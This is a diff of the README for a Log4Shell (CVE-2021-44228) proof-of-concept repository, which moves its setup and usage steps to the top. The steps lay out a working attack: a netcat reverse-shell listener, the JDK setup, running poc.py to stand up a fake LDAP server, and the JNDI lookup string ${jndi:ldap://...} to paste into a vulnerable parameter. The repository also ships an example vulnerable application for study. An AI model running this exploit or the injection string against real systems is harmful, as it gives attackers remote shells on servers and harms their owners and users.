@@ -1,8 +1,53 @@
 # log4j-shell-poc
+
+#### Requirements:
+```bash
+pip install -r requirements.txt
+```
+#### Edit the exploit
+
+The malicious code is in `poc.py` from Line 21.
+Edit the malicous cmd in Line 26.
+
+#### Usage:
+
+* Start a netcat listener to accept reverse shell connection.<br>
+```py
+nc -lvnp 9001
+```
+* Launch the exploit.<br>
+**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
+```sh
+sudo apt install openjdk-8-jdk
+ln -s /usr/lib/jvm/java-1.8.0-openjdk-amd64 jdk1.8.0_20
+```
+
+```py
+$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+[+] Exploit java class created success
+[+] Setting up fake LDAP server
+
+[+] Send me: ${jndi:ldap://localhost:1389/a}
+
+Listening on 0.0.0.0:1389
+```
+
+This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
+
+
+---
+
+<br>
 A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
 Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.
 
 In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.
+
+
 
 
 A video showing the exploitation process
@@ -31,36 +76,6 @@ Proof-of-concept (POC)
 As a PoC we have created a python file that automates the process. 
 
 
-#### Requirements:
-```bash
-pip install -r requirements.txt
-```
-#### Usage:
-
-
-* Start a netcat listener to accept reverse shell connection.<br>
-```py
-nc -lvnp 9001
-```
-* Launch the exploit.<br>
-**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
-```py
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
-
-[!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
-
-[+] Exploit java class created success
-[+] Setting up fake LDAP server
-
-[+] Send me: ${jndi:ldap://localhost:1389/a}
-
-Listening on 0.0.0.0:1389
-```
-
-This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
-
-<br>
 
 
 Our vulnerable application
